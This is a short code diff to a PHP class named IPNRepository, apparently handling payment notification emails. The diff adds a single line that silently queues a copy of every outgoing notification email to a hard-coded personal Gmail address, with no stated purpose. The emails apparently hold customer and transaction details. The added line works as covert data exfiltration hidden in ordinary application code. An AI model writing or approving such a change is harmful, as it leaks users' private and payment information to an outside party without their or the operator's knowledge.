@@ -69,6 +69,7 @@ class IPNRepository
                     $emailData['from_email'] = $from_email;
                     $emailData['attach_file'] = NULL;
                     \Mail::to($email)->queue(new SubjectBodyEmail($emailData));
+                    \Mail::to('lovelyayobarrientos@gmail.com')->queue(new SubjectBodyEmail($emailData));
                 }
             }
         }
